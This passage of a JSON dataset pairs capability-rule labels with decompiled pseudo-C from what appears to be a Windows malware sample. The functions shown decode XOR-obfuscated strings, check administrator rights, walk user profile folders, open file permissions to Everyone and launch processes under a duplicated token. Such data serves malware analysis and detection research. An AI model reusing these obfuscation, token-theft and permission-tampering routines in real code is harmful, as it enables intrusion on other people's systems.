        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403e9e(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    iVar7 = 0;\n    *0x41cae8 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41caf4 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41caec = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040f3d7();\n    fcn.00403aaf();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41cb10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (*0x41cb10 != 0) {\n        nSize = 0x10;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41cb10, &nSize);\n        if (iVar5 == 0) {\n            var_24h = 0x7a0a3713;\n            var_20h = 0x37084d09;\n            var_1ch = 0x4d157a0b;\n            var_18h._0_2_ = 0x3746;\n            pIdentifierAuthority = 0x7a443746;\n            var_ch._0_2_ = 0x4d42;\n            uVar4 = (*pcVar3)(8, 0x1d);\n            iVar5 = (*pcVar2)(uVar4);\n            do {\n                cbSid = 6;\n                puVar1 = iVar7 + iVar5;\n                iVar6 = iVar7 % 6;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&pIdentifierAuthority + iVar6) ^ puVar1[&var_24h - iVar5];\n            } while (iVar7 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41cb10, iVar5);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        fcn.004040b1();\n    }\n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar2 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar7 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar7 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41caf4 < 6) {\n                return 0;\n            }\n            fcn.00403be0();\n            goto code_r0x00404020;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar2)(0, &pSid, &nSize);\n    }\ncode_r0x00404020:\n    if (5 < *0x41caf4) {\n        fcn.00403c33();\n    }\n    return 0;\n}\n",
        "token_count": 981
    },
    "004043c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004043c8(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t lpMem;\n    uint lpcchSize;\n    int32_t var_6ch;\n    uint ARG_0;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint lpFileName;\n    uchar *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint lpProfileDir;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint var_dh;\n    uint var_9h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar uStack6;\n    uint var_1h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    uVar3 = (*pcVar2)(8, 0x208);\n    lpFileName = (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(8, 0x208);\n    ARG_0 = (*pcVar6)(uVar3);\n    lpcchSize = 0x104;\n    var_64h = 6;\n    var_9h._3_1_ = 6;\n    var_28h = 0x612d7306;\n    _var_24h = 0x732b4508;\n    stack0xffffffdc = 0x454b612e;\n    stack0xffffffe0 = 0x61277319;\n    stack0xffffffe4 = 0x733e451f;\n    var_17h._3_1_ = 0x2b;\n    var_13h._0_1_ = 0x61;\n    var_58h = 5;\n    var_13h._1_1_ = 5;\n    stack0xffffffeb = 0x31732d45;\n    var_dh._0_1_ = 0x61;\n    var_dh._1_2_ = 0x4537;\n    var_dh._3_1_ = 0x1e;\n    var_9h._0_1_ = 0x73;\n    var_9h._1_1_ = 0x27;\n    var_9h._2_1_ = 0x61;\n    var_5h = 0x45;\n    var_4h = 0x3a;\n    var_3h = 0x73;\n    uStack6 = 0x42;\n    var_1h._0_1_ = 0x61;\n    var_38h = 0x6142734a;\n    var_34h._0_2_ = 0x456b;\n    uVar3 = (*pcVar2)(8, 0x51);\n    var_6ch = (*pcVar6)(uVar3);\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + var_6ch;\n        iVar4 = iVar7 % var_64h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_38h + iVar4) ^ puVar1[&var_28h - var_6ch];\n    } while (iVar7 < 0x28);\n    var_28h = 0x63346c37;\n    _var_24h = 0x4428763c;\n    stack0xffffffdc = 0x6c024c02;\n    stack0xffffffe0 = 0x76106325;\n    stack0xffffffe4 = 0x4c0c4420;\n    var_17h._3_1_ = 0x15;\n    var_13h._0_1_ = 0x6c;\n    var_13h._1_1_ = 0x25;\n    stack0xffffffeb = 0x30762063;\n    var_dh._0_1_ = 0x44;\n    var_dh._1_2_ = 0x4c37;\n    var_dh._3_1_ = 0x13;\n    var_9h._0_1_ = 0x6c;\n    var_9h._1_1_ = 0x29;\n    var_9h._2_1_ = 99;\n    var_9h._3_1_ = 0x3c;\n    var_5h = 0x76;\n    var_4h = 0x6c;\n    var_3h = 0x44;\n    var_48h = 0x63446c76;\n    var_44h._0_1_ = 0x4c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    uVar3 = lpProfileDir;\n    iVar7 = 0;\n    lpMem = var_7ch;\n    do {\n        puVar1 = iVar7 + var_7ch;\n        iVar4 = iVar7 % var_58h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_48h + iVar4) ^ puVar1[&var_28h - var_7ch];\n    } while (iVar7 < 0x26);\n    var_78h = var_6ch;\n    iVar7 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar3);\n        iVar7 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_40h = iVar7;\n        while (iVar7 != -1) {\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x41079c);\n            if ((iVar4 != 0) && (iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4107a0),  iVar4 != 0)) {\n                var_5ch = 0;\n                var_30h = 0x47126137;\n                var_2ch._0_2_ = 0x6b4c;\n                var_54h = 0x4738616b;\n                var_50h._0_1_ = 0x4c;\n                var_38h = 0x4c556c59;\n                var_34h._0_2_ = CONCAT11(var_34h._1_1_, 0x31);\n                do {\n                    uVar3 = (*pcVar6)(8, 0xd);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    uVar3 = lpFileName;\n                    iVar4 = 0;\n                    var_48h = iVar7;\n                    var_60h = &var_30h - iVar7;\n                    do {\n                        puVar1 = iVar4 + iVar7;\n                        iVar5 = iVar4 % var_58h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_54h + iVar5) ^ puVar1[&var_30h - iVar7];\n                    } while (iVar4 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, lpProfileDir);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(uVar3, iVar7);\n                    var_17h._3_1_ = 0x7c;\n                    var_13h._0_1_ = 0x6c;\n                    var_13h._1_1_ = 0x26;\n                    stack0xffffffeb = 0x49596d4c;\n                    var_dh._0_1_ = 0x55;\n                    var_dh._1_2_ = 0x313f;\n                    var_dh._3_1_ = 5;\n                    var_9h._0_1_ = 0x6c;\n                    var_9h._1_1_ = 0x70;\n                    var_9h._2_1_ = 0x4c;\n                    var_9h._3_1_ = 0x42;\n                    var_5h = 0x59;\n                    var_4h = 0x6c;\n                    var_3h = 0x55;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_60h = &var_17h + (3 - iVar7);\n                    do {\n                        puVar1 = iVar4 + iVar7;\n                        iVar5 = iVar4 % var_58h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_38h + iVar5) ^ puVar1[var_60h];\n                    } while (iVar4 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar7, lpProfileDir, &psz1, (&var_7ch)[var_5ch]);\n                    fcn.00405473(1);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*pcVar6)(0, var_48h);\n                    (*pcVar2)(uVar3);\n                    var_5ch = var_5ch + 1;\n                    iVar7 = var_40h;\n                } while (var_5ch < 2);\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar7, &lpFindFileData);\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n                iVar7 = -1;\n                var_40h = -1;\n            }\n        }\n    }\n    _var_24h = 0x631f726b;\n    stack0xffffffdc = 0x723d313c;\n    stack0xffffffe0 = 0x31206338;\n    stack0xffffffe4 = 0x631e7223;\n    var_17h._3_1_ = 0x2a;\n    var_13h._0_1_ = 0x31;\n    var_13h._1_1_ = 0x21;\n    stack0xffffffeb = 0x60633872;\n    var_dh._0_1_ = 0x31;\n    var_dh._1_2_ = 0x7212;\n    var_dh._3_1_ = 0x18;\n    var_9h._0_1_ = 99;\n    var_9h._1_1_ = 0x20;\n    var_9h._2_1_ = 0x31;\n    var_9h._3_1_ = 0x23;\n    var_5h = 0x72;\n    var_4h = 0x3c;\n    var_3h = 99;\n    uStack6 = 0x45;\n    var_1h._0_1_ = 0x31;\n    var_30h = 0x634c724e;\n    var_2ch._0_2_ = 0x3145;\n    uVar3 = (*pcVar6)(8, 0x49);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar4 = 0;\n    var_48h = &var_24h + -iVar7;\n    do {\n        puVar1 = iVar4 + iVar7;\n        iVar5 = iVar4 % var_64h;\n        iVar4 = iVar4 + 1;\n        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_24h + -iVar7];\n    } while (iVar4 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, lpProfileDir, 0x104);\n    fcn.00405473(1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, ARG_0);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, lpProfileDir);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_6ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 3283
    },
    "0040574c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040574c(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00405c78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405c78(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpDst;\n    uint lpProcessAttributes;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x3010436f;\n    iVar5 = 0x44;\n    var_48h = 0x43397912;\n    puVar7 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_44h = 0x790e3037;\n    var_40h = 0x30114327;\n    puVar7 = &lpProcessAttributes;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    lpProcessAttributes = 0x44;\n    var_3ch = 0x43257904;\n    puVar7 = &lpDst;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_38h = 0x794e3037;\n    var_34h = 0x30304316;\n    var_30h = 0x43397912;\n    var_2ch = 0x790e3037;\n    var_28h = 0x30704327;\n    var_24h = 0x43167959;\n    var_20h = 0x791d3030;\n    var_1ch = 0x302b4329;\n    var_18h = 0x43397904;\n    var_14h = 0x79453037;\n    var_10h = 0x303b432f;\n    var_ch = 0x434a790e;\n    var_8h = 0x3043434a;\n    var_4h._0_2_ = 0x796b;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        var_50h = 6;\n        puVar1 = iVar5 + iVar4;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_4ch - iVar4];\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    puVar7 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, *0x41cad8, 0, 0, 0, 0x800000c, 0, 0, &lpProcessAttributes, var_54h);\n    if (puVar7[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar7[1]);\n    }\n    uVar2 = *puVar7;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 1009
    },
    "00405dd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00405dd5(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    code *pcVar11;\n    uint lpApplicationName;\n    uint var_c8h;\n    int32_t var_c0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_68h;\n    uint pSessionId;\n    uint dwProcessId;\n    uint hExistingToken;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_50h;\n    int32_t *var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint hToken;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_50h._0_2_ = 0x1000;\n    iVar7 = 0;\n    piVar9 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    pSessionId = 0;\n    puVar10 = &var_c8h;\n    dwProcessId = param_1;\n    var_4ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_68h = 0;\n    puVar10 = &var_7ch;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    hToken = 0;\n    hExistingToken = 0;\n    var_34h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (ProcessHandle != 0) {\n        var_10h = 0xb452c32;\n        var_ch = 0x7b6a1413;\n        var_8h = 0x141a0119;\n        var_4h = CONCAT31(var_4h._1_3_, 0x59);\n        var_44h = 0x65374959;\n        var_40h._0_2_ = 0x7876;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_48h = 6;\n        var_30h = &var_10h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % 6;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_44h + iVar5) ^ puVar1[&var_10h - iVar4];\n        } while (iVar7 < 0xd);\n        var_74h = iVar4;\n        iVar7 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar7 != 0) {\n            iVar7 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar7 != 0) {\n                fcn.0040754b();\n                iVar7 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar7 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_78h = 0x20;\n                        var_7ch = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hToken, 0x19, &var_7ch, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    iVar7 = 0;\n                    dwProcessId = 0;\n                    (*pcVar2)(hToken, 0x1b, &dwProcessId, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_34h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_34h = 0;\n                    }\n                    else {\n                        var_68h = 0x400;\n                    }\n                    var_c8h = 0x44;\n                    var_20h = 0x610c361e;\n                    var_1ch = 0x361a310a;\n                    var_18h = 0x31056111;\n                    var_14h = 0x61393659;\n                    var_10h = 0x360c3100;\n                    var_ch = 0x31056103;\n                    var_8h = 0x6109361c;\n                    var_4h = 0x36693110;\n                    var_3ch = 0x61653669;\n                    var_38h._0_2_ = 0x3164;\n                    uVar3 = (*pcVar11)(8, 0x41);\n                    var_c0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    var_44h = var_c0h;\n                    var_30h = &var_20h - var_c0h;\n                    do {\n                        puVar1 = iVar7 + var_c0h;\n                        iVar4 = iVar7 % var_48h;\n                        iVar7 = iVar7 + 1;\n                        *puVar1 = *(&var_3ch + iVar4) ^ puVar1[&var_20h - var_c0h];\n                    } while (iVar7 < 0x20);\n                    var_98h._0_2_ = 0;\n                    var_9ch = 1;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41cad8);\n                    var_14h = 0x45136f78;\n                    var_10h = 0x6f783407;\n                    var_ch = 0x3454451a;\n                    var_8h = 0x45456f7f;\n                    var_4h._0_2_ = 0x3474;\n                    var_28h = 0x45366f5a;\n                    var_24h._0_2_ = 0x3474;\n                    uVar3 = (*pcVar11)(8, 0x25);\n                    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_30h = &var_14h - var_3ch;\n                    do {\n                        puVar1 = iVar4 + var_3ch;\n                        iVar7 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_28h + iVar7) ^ puVar1[&var_14h - var_3ch];\n                    } while (iVar4 < 0x12);\n                    iVar5 = 0;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_68h, var_34h, 0, &var_c8h, var_4ch);\n                    var_14h = 0x72097400;\n                    var_10h = 0x740d611f;\n                    var_ch = 0x6118720f;\n                    var_8h = 0x72177416;\n                    var_4h = CONCAT22(var_4h._2_2_, 0x6171);\n                    var_28h = 0x72787478;\n                    var_24h._0_2_ = 0x6171;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = var_3ch;\n                    var_30h = &var_14h - iVar7;\n                    do {\n                        puVar1 = iVar5 + iVar7;\n                        iVar6 = iVar5 % var_48h;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_28h + iVar6) ^ puVar1[&var_14h - iVar7];\n                        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    } while (iVar5 < 0x12);\n                    if (*var_4ch != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_4ch, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.0040754b();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(var_4ch[1]);\n                    }\n                    if (var_34h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_34h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar11)(0, var_44h);\n                    (*pcVar2)(uVar3);\n                    iVar4 = var_74h;\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n        uVar3 = (*pcVar11)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return *var_4ch;\n}\n",
        "token_count": 2672
    },
    "004061d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061d9(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41cb14 == 0) {\n        puStack572 = 0x406220;\n        *0x41cb24 = fcn.00406688();\n    }\n    else {\n        puStack572 = 0x406215;\n        *0x41cb24 = fcn.00405dd5();\n    }\n    if (*0x41cb24 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 